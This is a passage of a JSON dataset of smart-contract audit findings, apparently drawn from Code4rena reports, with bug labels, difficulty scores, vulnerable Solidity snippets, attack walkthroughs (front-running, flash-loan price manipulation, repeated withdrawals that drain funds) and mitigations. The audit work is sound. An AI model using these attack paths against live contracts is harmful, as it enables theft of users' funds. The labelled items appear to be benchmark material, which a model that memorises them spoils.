\\\"8333333333333333333338\\\" } ]\",\n      \"This result in destruction of the pool.\",\n      \"Mathepreneur (Timeswap) confirmed\",\n      \"CloudEllie (C4) commented:\",\n      \"Warden rhynorater requested that we add to his submission.  See comment for details.\"\n    ],\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 152,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Lack of access control on assertGovernanceApproved can cause funds to be locked\\\"\",\n    \"line\": \"FlashGovernanceArbiter[60]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-01-lack-of-access-control-on-assertgovernanceapproved-can-cause-funds-to-be-locked\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw, also found by kirk-baird and pauliax\",\n      \"Lack of access control on theassertGovernanceApprovedfunction ofFlashGovernanceArbiterallows anyone to lock other users‚Äô funds in the contract as long as the users have approved the contract to transferflashGovernanceConfig.amountofflashGovernanceConfig.assetfrom them.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Alice wants to execute a flash governance decision (e.g., disable to the protocol), so she first callsapproveon theflashGovernanceConfig.assetto allowFlashGovernanceArbiterto transferflashGovernanceConfig.amountof assets from her.An attacker Bob, who listens to the mempool, notices Alice‚Äôsapprovetransaction and decides to front-run it. He callsassertGovernanceApprovedwithsenderbeing Alice,targetbeing any address, andemergencybeingtrue.As a result, Alice cannot execute her flash governance decision, and her funds are locked in the contract for theflashGovernanceConfig.unlockTimeperiod.\",\n      \"Referenced code:DAO/FlashGovernanceArbiter.sol#L60-L81\"\n    ],\n    \"recommended_mitigation\": [\n      \"Only allow certain addresses to call theassertGovernanceApprovedfunction onFlashGovernanceArbiter.\",\n      \"gititGoro (Behodler) confirmed, but disagreed with High severity and commented:\",\n      \"The reason I stuck with medium risk is because the user‚Äôs funds can‚Äôt be lost in this scenario. Only temporarily locked. If the user unapproves FlashGovernanceArbiter on EYE then they simply have to wait until the unlock period has passed and can withdraw again.\",\n      \"Jack the Pug (judge) commented:\",\n      \"Agreed. This should be somewhere in between Med and High. If it‚Äôs just the users‚Äô deposits being temporarily locked, then it‚Äôs definitely a Med. But this one is taking probably all the funds from users‚Äô wallets and locking them against their will, easy to pull off by anyone, all at once for all potential victims.I tend to make it a High so that the future wardens and probably by extent the devs can be more careful with allowances. We have seen so many incidents caused by improper handling of users‚Äô allowances.AtransferFrom()with from not being hard-coded asmsg.senderis evil.My fellow wardens, if you are reading this, do not go easy on atransferFrom()that takes an argument asfrom.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 153,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"wrong minting amount\\\"\",\n    \"line\": \"RebaseProxy[36]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-02-wrong-minting-amount\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by danb\",\n      \"https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/TokenProxies/RebaseProxy.sol#L36\",\n      \"should be:\",\n      \"gititGoro (Behodler) confirmed, but disagreed with High severity and commented:\",\n      \"Jack the Pug (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"uint256\\nproxy\\n= (\\nbaseBalance\\n*\\nONE\\n) /\\n_redeemRate\\n;\",\n      \"uint256\\nproxy\\n= (\\namount\\n*\\nONE\\n) /\\n_redeemRate\\n;\"\n    ],\n    \"quotes\": [\n      \"Should be a balanceBefore and balanceAfter calculation with the diff being wrapped.\",\n      \"Validhigh. The issue description can be more comprehensive though.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 154,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S3-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Logic error in burnFlashGovernanceAsset can cause locked assets to be stolen\\\"\",\n    \"line\": \"FlashGovernanceArbiter[134,146]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-04-logic-error-in-burnflashgovernanceasset-can-cause-locked-assets-to-be-stolen\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw\",\n      \"A logic error in theburnFlashGovernanceAssetfunction that resets a user‚ÄôspendingFlashDecisionallows that user to steal other user‚Äôs assets locked in future flash governance decisions. As a result, attackers can get their funds back even if they execute a malicious flash decision and the community burns their assets.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"An attacker Alice executes a malicious flash governance decision, and her assets are locked in theFlashGovernanceArbitercontract.The community disagrees with Alice‚Äôs flash governance decision and callsburnFlashGovernanceAssetto burn her locked assets. However, theburnFlashGovernanceAssetfunction resets Alice‚ÄôspendingFlashDecisionto the default config (see line 134).A benign user, Bob executes another flash governance decision, and his assets are locked in the contract.Now, Alice callswithdrawGovernanceAssetto withdraw Bob‚Äôs locked asset, effectively the same as stealing Bob‚Äôs assets. Since Alice‚ÄôspendingFlashDecisionis reset to the default, theunlockTime < block.timestampcondition is fulfilled, and the withdrawal succeeds.\",\n      \"Referenced code:DAO/FlashGovernanceArbiter.sol#L134DAO/FlashGovernanceArbiter.sol#L146\"\n    ],\n    \"recommended_mitigation\": [\n      \"Change line 134 todelete pendingFlashDecision[targetContract][user]instead of setting thependingFlashDecisionto the default.\",\n      \"gititGoro (Behodler) confirmed\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 155,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Flash loan price manipulation in purchasePyroFlan()\\\"\",\n    \"line\": \"FlanBackstop[83,102,103,108]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-05-flash-loan-price-manipulation-in-purchasepyroflan\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by sirhashalot\",\n      \"The comment online 54of FlanBackstop.sol states ‚Äúthe opportunity for price manipulation through flash loans exists‚Äù, and I agree that this is a serious risk. While the acceptableHighestPrice variable attempts to limit the maximum price change of the flan-stablecoin LP, a flashloan sandwich attack can still occur within this limit and make up for the limitation with larger volumes or multiple flashloan attacks. Flashloan price manipulation is the cause for many major hacks, includingbZx,Harvest, and others.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Line 83of FlanBackstop.sol calculates the price of flan to stablecoin in the Uniswap pool based on the balances at a single point in time. Pool balances at a single point in time can be manipulated with flash loans, which can skew the numbers to the extreme. The single data point of LP balances is used to calculatethe growth variable in line 103, and the growth variable influences the quantity of pyroflan a user receives inthe premium calculation on line 108.\",\n      \"uint256\\npriceBefore\\n= (\\nbalanceOfFlanBefore\\n*\\ngetMagnitude\\n(\\nstablecoin\\n)) /\\nbalanceOfStableBefore\\n;\\nuint256\\ngrowth\\n= ((\\npriceBefore\\n-\\ntiltedPrice\\n) *\\n100\\n) /\\npriceBefore\\n;\\nuint256\\npremium\\n= (\\nflanToMint\\n* (\\ngrowth\\n/\\n2\\n)) /\\n100\\n;\",\n      \"Problems can occur when the volumes that thepurchasePyroFlan()function sends to the Uniswap pool are large compared to the pool‚Äôs liquidity volume, or if the Uniswap pool price is temporarily tilted with a flashloan (or a whale). Because this function purposefully changes the exchange rate of the LP, by transferring tokens to the LP in a 2-to-1 ratio, a large volume could caught a large price impact in the LP. The code attempts to protect against this manipulation inline 102with a require statement, but this can be worked around by reducing the volume per flashloan and repeating the attack multiple times. A user can manipulate the LP, especially when the LP is new with low liquidity, in order to achieve large amounts of flan and pyroflan.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use a TWAP instead of the pool price at a single point in time to increase the cost of performing a flashloan sandwich attack. Seethe Uniswap v2 price oracle solutiondocumentation for more explanations on how Uniswap designed an approach to providing asset prices while reducing the change of manipulation.\",\n      \"gititGoro (Behodler) acknowledged and commented:\",\n      \"This is a very well constructed report and if Flan was not intended to target a 1:1 with stablecoins, I‚Äôd accept it but since we know Flan shouldn‚Äôt diverge far from 1:1, we don‚Äôt run very large risks. Essentially, if the flan price crashes dramatically, backstop no longer works so the purpose of this contract is to just boost liquidity for Flan when Flan is operating under normal ish conditions. It‚Äôs not intended to be black swan proof.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 156,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S4-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Loss Of Flash Governance Tokens If They Are Not Withdrawn Before The Next Request\\\"\",\n    \"line\": \"FlashGovernanceArbiter[60], Governable[50], FlashGovernanceArbiterLike[5]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-06-loss-of-flash-governance-tokens-if-they-are-not-withdrawn-before-the-next-request\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by kirk-baird\",\n      \"Users who have not calledwithdrawGovernanceAsset()after  they have locked their tokens from a previous proposal (i.e.assertGovernanceApproved), will lose their tokens ifassertGovernanceApproved()is called again with the sametargetandsender.\",\n      \"Thesenderwill losependingFlashDecision[target][sender].amounttokens and the tokens will become unaccounted for and locked in the contract. Since the new amount is not added to the previous amount, instead the previous amount is overwritten with the new amount.\",\n      \"The impact of this is worsened by another vulnerability, that isassertGovernanceApproved()is apublicfunction and may be called by any arbitrary user so long as thesenderfield has calledapprove()forFlashGovernanceArbiteron the ERC20 token. This would allow an attacker to make these tokens inaccessible for any arbitrarysender.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"InassertGovernanceApproved()as seen below, the linependingFlashDecision[target][sender] = flashGovernanceConfigwill overwrite the previous contents. Thereby, making any previous rewards unaccounted for and inaccessible to anyone.\",\n      \"Note that we must waitpendingFlashDecision[target][sender].unlockTimebetween calls.\",\n      \"function\\nassertGovernanceApproved\\n(\\naddress\\nsender\\n,\\naddress\\ntarget\\n,\\nbool\\nemergency\\n)\\npublic\\n{\\nif\\n(\\nIERC20\\n(\\nflashGovernanceConfig\\n.\\nasset\\n).\\ntransferFrom\\n(\\nsender\\n,\\naddress\\n(\\nthis\\n),\\nflashGovernanceConfig\\n.\\namount\\n) &&\\npendingFlashDecision\\n[\\ntarget\\n][\\nsender\\n].\\nunlockTime\\n<\\nblock\\n.\\ntimestamp\\n) {\\nrequire\\n(\\nemergency\\n|| (\\nblock\\n.\\ntimestamp\\n-\\nsecurity\\n.\\nlastFlashGovernanceAct\\n>\\nsecurity\\n.\\nepochSize\\n),\\n\\\"Limbo: flash governance disabled for rest of epoch\\\"\\n);\\npendingFlashDecision\\n[\\ntarget\\n][\\nsender\\n] =\\nflashGovernanceConfig\\n;\\npendingFlashDecision\\n[\\ntarget\\n][\\nsender\\n].\\nunlockTime\\n+=\\nblock\\n.\\ntimestamp\\n;\\nsecurity\\n.\\nlastFlashGovernanceAct\\n=\\nblock\\n.\\ntimestamp\\n;\\nemit\\nflashDecision\\n(\\nsender\\n,\\nflashGovernanceConfig\\n.\\nasset\\n,\\nflashGovernanceConfig\\n.\\namount\\n,\\ntarget\\n);\\n}\\nelse\\n{\\nrevert\\n(\\n\\\"LIMBO: governance decision rejected.\\\"\\n);\\n}\\n}\"\n    ],\n    \"recommended_mitigation\": [\n      \"Consider updating the initial if statement to ensure thependingFlashDecisionfor thattargetandsenderis empty, that is:\",\n      \"function\\nassertGovernanceApproved\\n(\\naddress\\nsender\\n,\\naddress\\ntarget\\n,\\nbool\\nemergency\\n)\\npublic\\n{\\nif\\n(\\nIERC20\\n(\\nflashGovernanceConfig\\n.\\nasset\\n).\\ntransferFrom\\n(\\nsender\\n,\\naddress\\n(\\nthis\\n),\\nflashGovernanceConfig\\n.\\namount\\n) &&\\npendingFlashDecision\\n[\\ntarget\\n][\\nsender\\n].\\nunlockTime\\n==\\n0\\n) {\\n...\",\n      \"Note we cannot simply add the newamountto the previousamountincase the underlyingassethas been changed.\",\n      \"gititGoro (Behodler) confirmed and commented:\",\n      \"Excellent find! Thank you.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 157,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"LP pricing formula is vulnerable to flashloan manipulation\\\"\",\n    \"line\": \"LimboDAO[392]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-behodler#h-07-lp-pricing-formula-is-vulnerable-to-flashloan-manipulation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw\",\n      \"The LP pricing formula used in theburnAssetfunction ofLimboDAOis vulnerable to flashloan manipulation. By swapping a large number of EYE into the underlying pool, an attacker can intentionally inflate the value of the LP tokens to get morefatethan he is supposed to with a relatively low cost.\",\n      \"With the large portion offatehe gets, he has more voting power to influence the system‚Äôs decisions, or even he can convert hisfateto Flan tokens for a direct profit.\",\n      \"Submitted by csanuragjain\",\n      \"unlockTimeis set incorrectly.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"This is actually a good fate inflation vector especially when combined with the fateToFlan conversion\"\n    ],\n    \"proof_of_concept\": [\n      \"Below is an example of how the attack works:\",\n      \"Suppose that there are 1000 EYE and 1000 LINK tokens in the UniswapV2 LINK-EYE pool. The pool‚Äôs total supply is 1000, and the attacker has 100 LP tokens.\",\n      \"If the attacker burns his LP tokens, he earns 1000 * 100/1000 * 20 = 2000 amount of fate.\",\n      \"Instead, the attacker swaps in 1000 EYE and gets 500 LINK from the pool (according to x * y = k, ignoring fees for simplicity). Now the pool contains 2000 EYE and 500 LINK tokens.\",\n      \"After the manipulation, he burns his LP tokens and gets 2000 * 100/1000 * 20 = 4000 amount of fate.\",\n      \"Lastly, he swaps 500 LINK into the pool to get back his 1000 EYE.\",\n      \"Compared to Step 2, the attacker earns a double amount of fate by only paying the swapping fees to the pool. The more EYE tokens he swaps into the pool, the more fate he can get. This attack is practically possible by leveraging flashloans or flashswaps from other pools containing EYE tokens.\",\n      \"The setEYEBasedAssetStake function has the same issue of using a manipulatable LP pricing formula. For more detailed explanations, please refer to the analysis of the Cheese Bank attack and the Warp Finance attack.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Use a fair pricing formula for the LP tokens, for example, the one proposed by Alpha Finance.\"\n    ]\n  },\n  {\n    \"row_number\": 158,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong token allocation computation for token decimals != 18 if floor price not reached\\\"\",\n    \"line\": \"LaunchEvent[377,398]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-trader-joe#h-02-wrong-token-allocation-computation-for-token-decimals--18-if-floor-price-not-reached\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"InLaunchEvent.createPair, when the floor price is not reached (floorPrice > wavaxReserve * 1e18 / tokenAllocated), the tokens to be sent to the pool are lowered to match the raised WAVAX at the floor price.\",\n      \"Note that thefloorPriceis supposed to have a precision of 18:\",\n      \"ThefloorPrice > (wavaxReserve * 1e18) / tokenAllocatedcheck is correct but thetokenAllocatedcomputation involves thetokendecimals:\",\n      \"This computation does not work fortokens that don‚Äôt have 18 decimals.\",\n      \"Assume I want to sell1.0 wBTC = 1e8 wBTC(8 decimals) at2,000.0 AVAX = 2,000 * 1e18 AVAX.\\nThefloorPriceis2000e18 * 1e18 / 1e8 = 2e31\",\n      \"Assume the Launch event only raised1,000.0 AVAX- half of the floor price for the issued token amount of1.0 WBTC(it should therefore allocate only half a WBTC) - and the token amount will be reduced as:floorPrice = 2e31 > 1000e18 * 1e18 / 1e8 = 1e31 = actualPrice.\\nThen,tokenAllocated = 1000e18 * 1e8 / 2e31 = 1e29 / 2e31 = 0and no tokens would be allocated, instead of0.5 WBTC = 0.5e8 WBTC.\",\n      \"The computation should betokenAllocated = wavaxReserve * 1e18 / floorPrice = 1000e18 * 1e18 / 2e31 = 1e39 / 2e31 = 10e38 / 2e31 = 5e7 = 0.5e8.\"\n    ],\n    \"code_blocks\": [\n      \"// @audit should be wavaxReserve * 1e18 / floorPrice\\ntokenAllocated\\n= (\\nwavaxReserve\\n*\\n10\\n**\\ntoken\\n.\\ndecimals\\n()) /\\nfloorPrice\\n;\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"The new tokenAllocated computation should be tokenAllocated = wavaxReserve * 1e18 / floorPrice;.\"\n    ]\n  },\n  {\n    \"row_number\": 159,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Treasury cannot claim COMP tokens & COMP tokens are stuck\\\"\",\n    \"line\": \"TreasuryAction[96]\",\n    \"url\": \" https://code4rena.com/reports/2022-01-notional#h-01-treasury-cannot-claim-comp-tokens--comp-tokens-are-stuck\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by leastwood\",\n      \"TheTreasuryAction.claimCOMPAndTransferfunction uses pre- and post-balances of theCOMPtoken to check which ones to transfer:\",\n      \"Note that anyone can claim COMP tokens on behalf of any address (seeComptroller.claimComp).\\nAn attacker can claim COMP tokens on behalf of the contract and it‚Äôll never be able to claim any compound itself.\\nThe COMP claimed by the attacker are stuck in the contract and cannot be retrieved.\\n(One can eventually get back the stuck COMP by creating a cCOMP market and then transferring it throughtransferReserveToTreasury.)\"\n    ],\n    \"code_blocks\": [\n      \"function\\nclaimCOMPAndTransfer\\n(\\naddress\\n[]\\ncalldata\\ncTokens\\n)\\nexternal\\noverride\\nonlyManagerContract\\nnonReentrant\\nreturns\\n(\\nuint256\\n)\\n{\\n// Take a snasphot of the COMP balance before we claim COMP so that we don't inadvertently transfer\\n// something we shouldn't.\\nuint256\\nbalanceBefore\\n=\\nCOMP\\n.\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n));\\nCOMPTROLLER\\n.\\nclaimComp\\n(\\naddress\\n(\\nthis\\n),\\ncTokens\\n);\\n// NOTE: If Notional ever lists COMP as a collateral asset it will be cCOMP instead and it\\n// will never hold COMP balances directly. In this case we can always transfer all the COMP\\n// off of the contract.\\nuint256\\nbalanceAfter\\n=\\nCOMP\\n.\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n));\\nuint256\\namountClaimed\\n=\\nbalanceAfter\\n.\\nsub\\n(\\nbalanceBefore\\n);\\n// NOTE: the onlyManagerContract modifier prevents a transfer to address(0) here\\nCOMP\\n.\\nsafeTransfer\\n(\\ntreasuryManagerContract\\n,\\namountClaimed\\n);\\n// NOTE: TreasuryManager contract will emit a COMPHarvested event\\nreturn\\namountClaimed\\n;\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Don‚Äôt use pre-and post-balances, can you use the entire balance?\",\n      \"jeffywu (Notional) disagreed with severity and commented:\",\n      \"Dispute as a high risk bug. Would categorize this as medium risk.There is no profit to be gained by doing this from the attacker besides denial of service. The protocol could simply upgrade to regain access to the tokens. We will fix this regardless.\",\n      \"pauliax (judge) commented:\",\n      \"Very good find.It is a tough decision if this should be classified as High or Medium severity. An exploiter cannot acquire those assets, and the contracts are upgradeable if necessary, however, I think this time I will leave it in favor of wardens who both are experienced enough and submitted this as of high severity:3 ‚Äî High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 160,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Wrong reward token calculation in MasterChef contract\\\"\",\n    \"line\": \"MasterChef[86]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-concur#h-01-wrong-reward-token-calculation-in-masterchef-contract\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by throttle, also found by cccz, cmichel, and leastwood\",\n      \"MasterChef.sol#L86\",\n      \"When adding new token pool for staking in MasterChef contract\",\n      \"All other, already added, pools should be updated but currently they are not.Instead, only totalPoints is updated. Therefore, old (and not updated) pools will lose it‚Äôs share during the next update.Therefore, user rewards are not computed correctly (will be always smaller).\"\n    ],\n    \"code_blocks\": [\n      \"function\\nadd\\n(\\naddress\\n_token\\n,\\nuint\\n_allocationPoints\\n,\\nuint16\\n_depositFee\\n,\\nuint\\n_startBlock\\n)\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Scenario 1:\",\n      \"Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100)and 1 block later Alice stakes 10 tokens in the first pool.1 week passesAlice withdraws her 10 tokens and claims X amount of reward tokens.and 1 block later Bob stakes 10 tokens in the first pool.1 week passesOwner adds new pool (second pool) for staking with points = 100 (totalPoints=200)and 1 block later Bob withdraws his 10 tokens and claims X/2 amount of reward tokens.But he should get X amount\",\n      \"Scenario 2:\",\n      \"Owner adds new pool (first pool) for staking with points = 100 (totalPoints=100).1 block later Alice, Bob and Charlie stake 10 tokens there (at the same time).1 week passesOwner adds new pool (second pool) for staking with points = 400 (totalPoints=500)Right after that, when Alice, Bob or Charlie wants to withdraw tokens and claim rewards they will only be able to claim 20% of what they should be eligible for, because their pool is updated with 20% (100/500) rewards instead of 100% (100/100) rewards for the past week.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Update all existing pools before adding new pool. Use the massUdpate() function which is already present ‚Ä¶ but unused.\",\n      \"ryuheimat (Concur) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has identified a fallacy in howadds logic work.Ultimately rewards in this contract have to be linearly vested over time, adding a new pool would change the rate at which vesting in all pools will go.For that reason, it is necessary to accrue the rewards that each pool generated up to that point, before changing the slope at which rewards will be distributed.In this case add should massUpdateFirst.Because this vulnerability ultimately breaks the accounting of the protocol, I believe High Severity to be appropriate.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 161,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Masterchef: Improper handling of deposit fee\\\"\",\n    \"line\": \"MasterChef[170]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-concur#h-02-masterchef-improper-handling-of-deposit-fee\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by hickuphh3, also found by leastwood\",\n      \"MasterChef.sol#L170-L172\",\n      \"If a pool‚Äôs deposit fee is non-zero, it is subtracted from the amount to be credited to the user.\",\n      \"However, the deposit fee is not credited to anyone, leading to permanent lockups of deposit fees in the relevant depositor contracts (StakingRewards and ConvexStakingWrapper for now).\",\n      \"Assume the following\",\n      \"Thecurve cDai / cUSDC / cUSDT LP tokencorresponds topid = 1in the convex booster contract.\",\n      \"Pool is added in Masterchef withdepositFeeBP = 100 (10%).\",\n      \"Alice deposits 1000 LP tokens via the ConvexStakingWrapper contract. A deposit fee of 100 LP tokens is charged. Note that thedepositsmapping of the ConvexStakingWrapper contract credits 1000 LP tokens to her.\",\n      \"However, Alice will only be able to withdraw 900 LP tokens. The 100 LP tokens is not credited to any party, and is therefore locked up permanently (essentially becomes protocol-owned liquidity). While she is able to dorequestWithdraw()for 1000 LP tokens, attempts to executewithdraw()with amount = 1000 will revert because she is only credited 900 LP tokens in the Masterchef contract.\",\n      \"CRV pool is added in Masterchef withdepositFeeBP = 100 (10%).\",\n      \"Alice deposits 1000 CRV into the StakingRewards contract. A deposit fee of 100 CRV is charged.\",\n      \"Alice is only able to withdraw 900 CRV tokens, while the 100 CRV is not credited to any party, and is therefore locked up permanently.\",\n      \"These examples are non-exhaustive as more depositors can be added / removed from the Masterchef contract.\"\n    ],\n    \"code_blocks\": [\n      \"if\\n(\\npool\\n.\\ndepositFeeBP\\n>\\n0\\n) {\\nuint\\ndepositFee\\n=\\n_amount\\n.\\nmul\\n(\\npool\\n.\\ndepositFeeBP\\n).\\ndiv\\n(\\n_perMille\\n);\\nuser\\n.\\namount\\n=\\nSafeCast\\n.\\ntoUint128\\n(\\nuser\\n.\\namount\\n+\\n_amount\\n-\\ndepositFee\\n);\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"I recommend shifting the deposit fee logic out of the masterchef contract into the depositor contracts themselves, as additional logic would have to be added in the masterchef to update the fee recipient‚Äôs state (rewardDebt, send pending concur rewards, update amount), which further complicates matters. As the fee recipient is likely to be the treasury, it is also not desirable for it to accrue concur rewards.\",\n      \"if\\n(\\npool\\n.\\ndepositFeeBP\\n>\\n0\\n) {\\nuint\\ndepositFee\\n=\\n_amount\\n.\\nmul\\n(\\npool\\n.\\ndepositFeeBP\\n).\\ndiv\\n(\\n_perMille\\n);\\nuser\\n.\\namount\\n=\\nSafeCast\\n.\\ntoUint128\\n(\\nuser\\n.\\namount\\n+\\n_amount\\n-\\ndepositFee\\n);\\nUserInfo\\nstorage\\nfeeRecipient\\n=\\nuserInfo\\n[\\n_pid\\n][\\nfeeRecipient\\n];\\n// TODO: update and send feeRecipient pending concur rewards\\nfeeRecipient\\n.\\namount\\n=\\nSafeCast\\n.\\ntoUint128\\n(\\nfeeRecipient\\n.\\namount\\n+\\ndepositFee\\n);\\n// TODO: update fee recipient's rewardDebt\\n}\",\n      \"ryuheimat (Concur) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has identified a way for funds to be forever lost, because of that reason I believe High Severity to be appropriate.Mitigation could be as simple as transferring the fee to afeeReceiveror adding a way to pull those fees.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 162,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S5-2\",\n    \"difficulty\": 19,\n    \"bug_description\": \" \\\"Repeated Calls to Shelter.withdraw Can Drain All Funds in Shelter\\\"\",\n    \"line\": \"Shelter[52]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-concur#h-03-repeated-calls-to-shelterwithdraw-can-drain-all-funds-in-shelter\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by mtz, also found by 0x1f8b, 0xliumin, bitbopper, cccz, cmichel, csanuragjain, Czar102, danb, Alex the Entreprenerd, GeekyLumberjack, gzeon, hickuphh3, hyh, leastwood, Randyyy, Rhynorater, Ruhum, and ShadowyNoobDev\",\n      \"Shelter.sol#L52-L57\",\n      \"tl;dr Anyone who can callwithdrawto withdraw their own funds can call it repeatedly to withdraw the funds of others.withdrawshould only succeed if the user hasn‚Äôt withdrawn the token already.\",\n      \"The shelter can be used for users to withdraw funds in the event of an emergency. Thewithdrawfunction allows callers to withdraw tokens based on the tokens they have deposited into the shelter client: ConvexStakingWrapper. However,withdrawdoes not check if a user has already withdrawn their tokens. Thus a user that canwithdrawtokens, can call withdraw repeatedly to steal the tokens of others.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"tl;dr an attacker that can successfully callwithdrawonce on a shelter, can call it repeatedly to steal the funds of others. Below is a detailed scenario where this situation can be exploited.\",\n      \"Mallory deposits 1wETHintoConvexStakingWrapperusingdeposit. Let‚Äôs also assume that other users have deposited 2wETHinto the same contract.An emergency happens and the owner ofConvexStakingWrappercallssetShelter(shelter)andenterShelter([pidOfWETHToken, ...]). Nowshelterhas 3wETHand is activated forwETH.Mallory callsshelter.withdraw(wETHAddr, MalloryAddr), Mallory will rightfully receive 1 wETH because her share of wETH in the shelter is 1/3.Mallory callsshelter.withdraw(wETHAddr, MalloryAddr)again, receiving 1/3*2 = 2/3 wETH.withdrawdoes not check that she has already withdrawn. This time, the wETH does not belong to her, she has stolen the wETH of the other users. She can continue callingwithdrawto steal the rest of the funds\"\n    ],\n    \"recommended_mitigation\": [\n      \"To mitigate this,withdrawmust first check thatmsg.senderhas not withdrawn this token before andwithdrawmust also record thatmsg.senderhas withdrawn the token.\\nThe exact steps for this are below:\",\n      \"Add the following line to the beginning ofwithdraw(line 53):\",\n      \"require(!claimed[_token][msg.sender], \\\"already claimed\\\")\",\n      \"Replaceline 55with the following:\",\n      \"claimed[_token][msg.sender] = true;\",\n      \"This replacement is necessary because we want to record who is withdrawing, not where they are sending the token which isn‚Äôt really useful info.\",\n      \"ryuheimat (Concur) confirmed\",\n      \"Alex the Entreprenerd (judge) commented:\",\n      \"The warden has identified a logical fallacy in theSheltercontract.This would allow a caller to claim their tokens multiple times, as long as they send them to a new address.Mitigation is as simple as checking claims againstmsg.sender, however because all funds can be drained, this finding is of High Severity.\",\n      \"\"\n    ]\n  },\n  {\n    \"row_number\": 164,\n    \"bug_id\": \" H-11\",\n    \"bug_label\": \" S2-2\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"ConvexStakingWrapper._calcRewardIntegral() Can Be Manipulated To Steal Tokens From Other Pools\\\"\",\n    \"line\": \"ConvexStakingWrapper[216]\",\n    \"url\": \" https://code4rena.com/reports/2022-02-concur#h-11-convexstakingwrapper_calcrewardintegral-can-be-manipulated-to-steal-tokens-from-other-pools\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by leastwood, also found by cmichel and kirk-baird\",\n      \"TheConvexStakingWrapper.solimplementation makes several modifications to the original design. One of the key changes is the ability to add multiple pools into the wrapper contract, where each pool is represented by a unique_pid. By doing this, we are able to aggregate pools and their LP tokens to simplify the token distribution process.\",\n      \"However, the interdependence between pools introduces new problems. Because the original implementation uses the contract‚Äôs reward token balance to track newly claimed tokens, it is possible for a malicious user to abuse the unguardedgetRewardfunction to maximise the profit they are able to generate. By callinggetRewardon multiple pools with the same reward token (i.e.cvx), users are able to siphon rewards 